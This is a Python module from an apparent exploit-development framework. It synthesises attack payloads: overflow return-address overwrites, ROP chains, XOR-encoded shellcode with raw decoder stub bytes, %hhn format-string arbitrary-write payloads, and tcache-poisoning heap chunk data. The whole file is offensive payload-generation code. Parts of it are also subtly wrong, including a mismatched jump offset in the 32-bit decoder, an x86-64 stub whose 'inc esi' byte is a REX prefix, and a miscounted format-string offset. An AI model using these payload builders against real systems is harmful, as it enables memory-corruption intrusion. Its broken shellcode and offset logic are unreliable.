"""
Automatic Payload Synthesis.

Uses constraint solving and program synthesis techniques to
automatically generate payloads that satisfy complex requirements.
"""

import struct
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union

from supwngo.core.binary import Binary
from supwngo.utils.helpers import p64, p32, p16
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)

# Try to import Z3
try:
    from z3 import (
        And, BitVec, BitVecVal, BoolVal, Concat, Extract, If, Implies,
        Not, Or, Optimize, Solver, UDiv, ULT, UGT, ULE, UGE, URem,
        sat, unsat, simplify, Sum, LShR, ZeroExt, SignExt
    )
    Z3_AVAILABLE = True
except ImportError:
    Z3_AVAILABLE = False


class PayloadType(Enum):
    """Types of payloads to synthesize."""
    SHELLCODE = auto()
    ROP_CHAIN = auto()
    FORMAT_STRING = auto()
    HEAP_SPRAY = auto()
    OVERFLOW = auto()


@dataclass
class PayloadConstraints:
    """Constraints for payload synthesis."""
    max_length: int = 1000
    bad_chars: bytes = b""
    must_be_printable: bool = False
    alignment: int = 1
    null_free: bool = False
    newline_free: bool = False

    # Position constraints
    fixed_positions: Dict[int, int] = field(default_factory=dict)  # offset -> value

    # Value constraints
    must_contain: List[bytes] = field(default_factory=list)
    must_not_contain: List[bytes] = field(default_factory=list)

    def get_bad_chars_set(self) -> Set[int]:
        """Get set of bad character values."""
        bad = set(self.bad_chars)
        if self.null_free:
            bad.add(0)
        if self.newline_free:
            bad.add(ord('\n'))
            bad.add(ord('\r'))
        return bad


@dataclass
class SynthesizedPayload:
    """Result of payload synthesis."""
    payload: bytes
    length: int
    technique: str
    constraints_satisfied: bool
    metadata: Dict[str, Any] = field(default_factory=dict)

    def hex(self) -> str:
        return self.payload.hex()

    def __repr__(self) -> str:
        return f"<SynthesizedPayload len={self.length} technique={self.technique}>"


class PayloadSynthesizer:
    """
    Automatic payload synthesis using constraint solving.

    Uses Z3 SMT solver to generate payloads that satisfy
    multiple constraints simultaneously.

    Example:
        synth = PayloadSynthesizer()

        # Generate null-free shellcode wrapper
        constraints = PayloadConstraints(
            max_length=100,
            null_free=True,
            bad_chars=b'\\x00\\x0a\\x0d'
        )

        shellcode = b'\\x31\\xc0...'  # Original shellcode
        result = synth.encode_shellcode(shellcode, constraints)
    """

    # Printable character range
    PRINTABLE_RANGE = range(0x20, 0x7f)

    def __init__(self, arch: str = 'amd64', bits: int = 64):
        """
        Initialize synthesizer.

        Args:
            arch: Target architecture
            bits: Bit width
        """
        if not Z3_AVAILABLE:
            raise ImportError("z3-solver required. Install with: pip install z3-solver")

        self.arch = arch
        self.bits = bits
        self.pack = p64 if bits == 64 else p32

    def synthesize_overflow(
        self,
        offset: int,
        target_value: int,
        constraints: Optional[PayloadConstraints] = None
    ) -> Optional[SynthesizedPayload]:
        """
        Synthesize buffer overflow payload.

        Args:
            offset: Offset to target (e.g., return address)
            target_value: Value to write at offset
            constraints: Payload constraints

        Returns:
            Synthesized payload or None
        """
        constraints = constraints or PayloadConstraints()

        # Calculate payload size
        payload_size = offset + (self.bits // 8)

        if payload_size > constraints.max_length:
            logger.warning(f"Payload size {payload_size} exceeds max {constraints.max_length}")
            return None

        # Create symbolic bytes
        solver = Solver()
        payload_bytes = [BitVec(f'b{i}', 8) for i in range(payload_size)]

        # Add bad character constraints
        bad_chars = constraints.get_bad_chars_set()
        for i, byte in enumerate(payload_bytes):
            for bad in bad_chars:
                solver.add(byte != bad)

        # Add printable constraint if needed
        if constraints.must_be_printable:
            for byte in payload_bytes:
                solver.add(byte >= 0x20)
                solver.add(byte < 0x7f)

        # Add fixed position constraints
        for pos, val in constraints.fixed_positions.items():
            if pos < payload_size:
                solver.add(payload_bytes[pos] == val)

        # Add target value constraint at offset
        target_bytes = self.pack(target_value)
        for i, b in enumerate(target_bytes):
            pos = offset + i
            if pos < payload_size:
                solver.add(payload_bytes[pos] == b)

        # Solve
        if solver.check() == sat:
            model = solver.model()
            payload = bytes([
                model[payload_bytes[i]].as_long() if model[payload_bytes[i]] is not None else 0x41
                for i in range(payload_size)
            ])

            return SynthesizedPayload(
                payload=payload,
                length=len(payload),
                technique="buffer_overflow",
                constraints_satisfied=True,
                metadata={
                    "offset": offset,
                    "target_value": hex(target_value),
                }
            )

        return None

    def synthesize_rop_addresses(
        self,
        addresses: List[int],
        constraints: Optional[PayloadConstraints] = None
    ) -> Optional[SynthesizedPayload]:
        """
        Synthesize ROP chain checking for bad characters.

        Args:
            addresses: List of gadget addresses
            constraints: Payload constraints

        Returns:
            Synthesized payload or None if constraints unsatisfied
        """
        constraints = constraints or PayloadConstraints()
        bad_chars = constraints.get_bad_chars_set()

        # Check each address for bad chars
        payload_parts = []
        for addr in addresses:
            addr_bytes = self.pack(addr)

            # Check for bad characters
            if any(b in bad_chars for b in addr_bytes):
                logger.warning(f"Address 0x{addr:x} contains bad characters")

                # Try to find alternative (add ret gadget)
                # This is simplified - real implementation would search for alternatives
                return None

            payload_parts.append(addr_bytes)

        payload = b''.join(payload_parts)

        if len(payload) > constraints.max_length:
            return None

        return SynthesizedPayload(
            payload=payload,
            length=len(payload),
            technique="rop_chain",
            constraints_satisfied=True,
            metadata={"num_gadgets": len(addresses)}
        )

    def encode_shellcode(
        self,
        shellcode: bytes,
        constraints: Optional[PayloadConstraints] = None
    ) -> Optional[SynthesizedPayload]:
        """
        Encode shellcode to satisfy constraints.

        Uses XOR encoding, alphanumeric encoding, or other techniques
        to transform shellcode while preserving functionality.

        Args:
            shellcode: Original shellcode
            constraints: Encoding constraints

        Returns:
            Encoded shellcode with decoder stub
        """
        constraints = constraints or PayloadConstraints()
        bad_chars = constraints.get_bad_chars_set()

        # Check if encoding needed
        needs_encoding = any(b in bad_chars for b in shellcode)

        if not needs_encoding and len(shellcode) <= constraints.max_length:
            return SynthesizedPayload(
                payload=shellcode,
                length=len(shellcode),
                technique="no_encoding",
                constraints_satisfied=True,
            )

        # Try XOR encoding
        xor_result = self._xor_encode(shellcode, bad_chars, constraints)
        if xor_result:
            return xor_result

        # Try alphanumeric encoding if printable required
        if constraints.must_be_printable:
            alpha_result = self._alphanumeric_encode(shellcode, constraints)
            if alpha_result:
                return alpha_result

        return None

    def _xor_encode(
        self,
        shellcode: bytes,
        bad_chars: Set[int],
        constraints: PayloadConstraints
    ) -> Optional[SynthesizedPayload]:
        """XOR encode shellcode with suitable key."""
        # Find single-byte XOR key that avoids bad chars
        for key in range(1, 256):
            if key in bad_chars:
                continue

            encoded = bytes([b ^ key for b in shellcode])

            # Check if encoded avoids bad chars
            if not any(b in bad_chars for b in encoded):
                # Generate decoder stub
                decoder = self._generate_xor_decoder(key, len(shellcode))

                # Check decoder for bad chars
                if any(b in bad_chars for b in decoder):
                    continue

                full_payload = decoder + encoded

                if len(full_payload) <= constraints.max_length:
                    return SynthesizedPayload(
                        payload=full_payload,
                        length=len(full_payload),
                        technique="xor_encoding",
                        constraints_satisfied=True,
                        metadata={
                            "xor_key": key,
                            "decoder_size": len(decoder),
                            "encoded_size": len(encoded),
                        }
                    )

        return None

    def _generate_xor_decoder(self, key: int, length: int) -> bytes:
        """Generate XOR decoder stub."""
        if self.arch == 'amd64':
            # x86-64 XOR decoder
            # Assumes shellcode follows immediately after decoder
            decoder = bytes([
                0xeb, 0x0d,              # jmp get_shellcode
                # decode:
                0x5e,                    # pop rsi
                0x31, 0xc9,              # xor ecx, ecx
                0xb1, length & 0xff,     # mov cl, length
                # loop:
                0x80, 0x36, key,         # xor byte [rsi], key
                0x46,                    # inc esi
                0xe2, 0xfa,              # loop loop
                0xff, 0xe6,              # jmp rsi (to shellcode start)
                # get_shellcode:
                0xe8, 0xee, 0xff, 0xff, 0xff,  # call decode
            ])
        else:
            # x86 XOR decoder
            decoder = bytes([
                0xeb, 0x0b,              # jmp get_shellcode
                # decode:
                0x5e,                    # pop esi
                0x31, 0xc9,              # xor ecx, ecx
                0xb1, length & 0xff,     # mov cl, length
                # loop:
                0x80, 0x36, key,         # xor byte [esi], key
                0x46,                    # inc esi
                0xe2, 0xfa,              # loop loop
                0xff, 0xe6,              # jmp esi
                # get_shellcode:
                0xe8, 0xf0, 0xff, 0xff, 0xff,  # call decode
            ])

        return decoder

    def _alphanumeric_encode(
        self,
        shellcode: bytes,
        constraints: PayloadConstraints
    ) -> Optional[SynthesizedPayload]:
        """
        Encode shellcode using alphanumeric characters only.

        This is complex - uses ALPHA2/3 style encoding.
        """
        # Simplified alphanumeric encoding
        # Real implementation would use proper alpha encoder

        # Check if already alphanumeric
        if all(0x21 <= b <= 0x7e for b in shellcode):
            return SynthesizedPayload(
                payload=shellcode,
                length=len(shellcode),
                technique="already_alphanumeric",
                constraints_satisfied=True,
            )

        # Use pwntools encoding if available
        try:
            from pwnlib.encoders import alpha
            encoded = alpha.encode(shellcode)
            if encoded and len(encoded) <= constraints.max_length:
                return SynthesizedPayload(
                    payload=encoded,
                    length=len(encoded),
                    technique="alphanumeric",
                    constraints_satisfied=True,
                )
        except:
            pass

        return None

    def synthesize_format_string(
        self,
        writes: Dict[int, int],
        offset: int,
        constraints: Optional[PayloadConstraints] = None
    ) -> Optional[SynthesizedPayload]:
        """
        Synthesize format string payload for arbitrary writes.

        Args:
            writes: Dictionary of address -> value to write
            offset: Format string offset
            constraints: Payload constraints

        Returns:
            Format string payload
        """
        constraints = constraints or PayloadConstraints()

        # Use %hhn for byte-by-byte writes (most compatible)
        payload_parts = []
        current_written = 0

        # Sort writes by address
        sorted_writes = sorted(writes.items())

        for addr, value in sorted_writes:
            # Write each byte
            for byte_offset in range(self.bits // 8):
                byte_val = (value >> (byte_offset * 8)) & 0xff
                target_addr = addr + byte_offset

                # Calculate padding needed
                to_write = (byte_val - current_written) % 256
                if to_write == 0:
                    to_write = 256

                # Generate format specifier
                if to_write > 1:
                    payload_parts.append(f"%{to_write}c".encode())
                else:
                    payload_parts.append(b"%c")

                payload_parts.append(f"%{offset + len(payload_parts)}$hhn".encode())
                current_written = byte_val

        # Add target addresses at the end
        for addr, value in sorted_writes:
            for byte_offset in range(self.bits // 8):
                payload_parts.append(self.pack(addr + byte_offset))

        payload = b''.join(payload_parts)

        # Check constraints
        bad_chars = constraints.get_bad_chars_set()
        if any(b in bad_chars for b in payload):
            logger.warning("Format string payload contains bad characters")
            # Could try alternative format specifiers here
            return None

        if len(payload) > constraints.max_length:
            return None

        return SynthesizedPayload(
            payload=payload,
            length=len(payload),
            technique="format_string",
            constraints_satisfied=True,
            metadata={"num_writes": len(writes)}
        )

    def synthesize_heap_data(
        self,
        target_value: int,
        size: int,
        constraints: Optional[PayloadConstraints] = None
    ) -> Optional[SynthesizedPayload]:
        """
        Synthesize heap chunk data (for tcache poisoning, etc.)

        Args:
            target_value: Target fd/bk pointer value
            size: Chunk size
            constraints: Payload constraints

        Returns:
            Chunk payload
        """
        constraints = constraints or PayloadConstraints()

        # Build chunk data
        payload = self.pack(target_value)  # fd pointer

        # Pad to size
        remaining = size - len(payload)
        if remaining > 0:
            payload += b'\x00' * remaining

        # Check bad chars
        bad_chars = constraints.get_bad_chars_set()
        if constraints.null_free and any(b == 0 for b in payload[:8]):
            # Target address contains null - may need different technique
            logger.warning("Heap payload contains null bytes")

        return SynthesizedPayload(
            payload=payload,
            length=len(payload),
            technique="heap_chunk",
            constraints_satisfied=True,
            metadata={"chunk_size": size}
        )


class ConstraintSolver:
    """
    Generic constraint solver for payload generation.

    Uses Z3 to solve complex multi-constraint problems.
    """

    def __init__(self, bits: int = 64):
        """Initialize solver."""
        if not Z3_AVAILABLE:
            raise ImportError("z3-solver required")
        self.bits = bits
        self.solver = Optimize()  # Use Optimize for optimization goals

    def add_byte_constraint(
        self,
        byte_var: Any,
        allowed: Optional[Set[int]] = None,
        forbidden: Optional[Set[int]] = None
    ):
        """Add constraint on a byte variable."""
        if forbidden:
            for val in forbidden:
                self.solver.add(byte_var != val)
        if allowed:
            self.solver.add(Or([byte_var == val for val in allowed]))

    def add_value_constraint(
        self,
        var: Any,
        value: int
    ):
        """Add equality constraint."""
        self.solver.add(var == value)

    def add_range_constraint(
        self,
        var: Any,
        min_val: int,
        max_val: int
    ):
        """Add range constraint."""
        self.solver.add(UGE(var, min_val))
        self.solver.add(ULE(var, max_val))

    def minimize(self, expr: Any):
        """Add minimization goal."""
        self.solver.minimize(expr)

    def maximize(self, expr: Any):
        """Add maximization goal."""
        self.solver.maximize(expr)

    def check(self) -> bool:
        """Check if constraints are satisfiable."""
        return self.solver.check() == sat

    def get_model(self) -> Optional[Any]:
        """Get satisfying model."""
        if self.solver.check() == sat:
            return self.solver.model()
        return None


# Convenience function
def synthesize_payload(
    payload_type: PayloadType,
    arch: str = 'amd64',
    **kwargs
) -> Optional[SynthesizedPayload]:
    """
    High-level payload synthesis function.

    Args:
        payload_type: Type of payload to generate
        arch: Target architecture
        **kwargs: Type-specific parameters

    Returns:
        Synthesized payload or None
    """
    bits = 64 if arch in ('amd64', 'arm64', 'aarch64') else 32
    synth = PayloadSynthesizer(arch, bits)

    constraints = kwargs.pop('constraints', None)

    if payload_type == PayloadType.OVERFLOW:
        return synth.synthesize_overflow(
            offset=kwargs.get('offset', 0),
            target_value=kwargs.get('target_value', 0),
            constraints=constraints
        )
    elif payload_type == PayloadType.ROP_CHAIN:
        return synth.synthesize_rop_addresses(
            addresses=kwargs.get('addresses', []),
            constraints=constraints
        )
    elif payload_type == PayloadType.SHELLCODE:
        return synth.encode_shellcode(
            shellcode=kwargs.get('shellcode', b''),
            constraints=constraints
        )
    elif payload_type == PayloadType.FORMAT_STRING:
        return synth.synthesize_format_string(
            writes=kwargs.get('writes', {}),
            offset=kwargs.get('offset', 6),
            constraints=constraints
        )
    elif payload_type == PayloadType.HEAP_SPRAY:
        return synth.synthesize_heap_data(
            target_value=kwargs.get('target_value', 0),
            size=kwargs.get('size', 0x20),
            constraints=constraints
        )

    return None
